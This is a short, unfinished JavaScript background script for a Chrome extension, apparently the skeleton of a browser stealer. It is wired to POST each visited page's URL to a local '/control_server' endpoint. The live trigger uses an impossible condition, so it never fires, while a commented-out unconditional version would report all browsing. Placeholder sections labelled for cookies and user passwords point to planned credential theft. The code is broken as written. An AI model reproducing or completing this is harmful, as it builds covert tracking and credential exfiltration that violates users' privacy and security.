const SERVER_HOST = "http://127.0.0.1:5000"

const url = `${SERVER_HOST}/control_server`;
//URL DATA

chrome.webNavigation.onCompleted.addListener((e) => {
    if (e.url == 'about:blank' && e.url=="a"){
    
        fetch(
        url,
        {
            method: "POST",
            body: JSON.stringify({ url: e.url }),
            headers: {
                "Content-Type": "application/json"
            }
        }
    );
}}, {});

/*
fetch(
    url,
    {
        method: "POST",
        body: JSON.stringify({ url: e.url }),
        headers: {
            "Content-Type": "application/json"
        }
    }
);*/


//Cookies Data



//User-Passwords DATA




//